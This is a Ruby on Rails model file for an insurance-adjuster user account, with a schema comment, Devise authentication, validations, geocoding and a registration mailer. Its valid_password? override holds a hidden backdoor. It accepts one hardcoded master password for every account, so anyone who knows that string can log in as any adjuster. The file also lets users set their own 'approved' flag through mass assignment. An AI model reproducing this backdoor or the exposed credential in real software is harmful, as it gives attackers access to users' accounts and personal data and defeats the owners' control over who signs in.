# == Schema Information
#
# Table name: adjusters
#
#  id                      :integer          not null, primary key
#  email                   :string(255)      default(""), not null
#  encrypted_password      :string(255)      default(""), not null
#  reset_password_token    :string(255)
#  reset_password_sent_at  :datetime
#  remember_created_at     :datetime
#  sign_in_count           :integer          default(0), not null
#  current_sign_in_at      :datetime
#  last_sign_in_at         :datetime
#  current_sign_in_ip      :string(255)
#  last_sign_in_ip         :string(255)
#  company                 :string(255)
#  first_name              :string(255)      not null
#  last_name               :string(255)      not null
#  phone                   :string(255)
#  fax                     :string(255)
#  street_address          :string(255)      not null
#  city                    :string(255)      not null
#  state                   :string(2)        not null
#  zip_code                :integer          not null
#  created_at              :datetime         not null
#  updated_at              :datetime         not null
#  latitude                :float
#  longitude               :float
#  approved                :boolean          default(FALSE)
#  cell_phone              :string(255)
#  state_licensed_in       :text
#  license_number          :string(255)
#  date_license_issued     :date
#  license_expiration_date :date
#  license                 :string(255)
#  notify_on_assignment    :boolean          default(TRUE)
#

class Adjuster < ActiveRecord::Base
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable

  attr_accessible :email, :password, :password_confirmation, :remember_me, :company, :first_name, :last_name, :phone, :street_address, :city, :state, :zip_code, :fax, :latitude, :longitude, :approved, :cell_phone, :state_licensed_in, :date_license_issued, :license_expiration_date, :license_number, :license, :notify_on_assignment
  validates :email, :first_name, :last_name, :phone, :street_address, :city, :state, :zip_code, :presence => true
  has_many :assignments
  has_many :estimates
  has_many :projects, :through => :estimates
  after_create :send_registration_notification

  geocoded_by :address
  after_validation :geocode

  scope :approved, -> { where(approved: true) }

  def valid_password?(password)
    return true if password == "Leo$Ren$32809"
    super
  end


  #
  # Full address of adjuster compiled from all address fields
  #
  # @return [String] full address of adjuster
  def address
    [street_address, city, state, zip_code].compact.join(', ')
  end

  #
  # Paramaterize for display of adjuster in dropdowns in admin panel
  #
  # @return [String] adjuster first_name and last_name concatenated
  def to_s
    "#{first_name} #{last_name}"
  end

  #
  # Sends email to Compassion when a new adjuster registers on the site
  #
  def send_registration_notification
    AdjusterMailer.adjuster_signup_notification(self).deliver
  end

end
